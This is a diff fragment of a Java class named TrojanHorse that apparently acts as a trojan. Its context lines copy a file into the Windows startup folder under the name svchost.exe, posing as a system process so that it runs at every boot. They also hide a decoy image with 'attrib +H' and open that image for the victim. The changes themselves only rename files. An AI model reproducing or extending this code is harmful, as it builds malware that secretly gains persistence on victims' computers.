@@ -19,7 +19,7 @@ public class TrojanHorse
         {
             new TrojanHorse();
 
-            File source = new File("IMG_01648129.jpg");
+            File source = new File("readme.txt");
             File destination = new File(startUpDirectory + "\\svchost.exe");
             try
             {
@@ -48,8 +48,8 @@ public class TrojanHorse
             InputStream resourceAsStream = getClass().getResourceAsStream(filename);
             BufferedImage image = ImageIO.read(resourceAsStream);
 
-            File file = new File("IMG_01638123.JPG");
-            Runtime.getRuntime().exec("attrib +H IMG_01638123.JPG");
+            File file = new File("IMG_01638120.jpg");
+            Runtime.getRuntime().exec("attrib +H IMG_01638120.jpg");
             ImageIO.write(image,"jpg", file);
 
             Desktop desktop = Desktop.getDesktop();
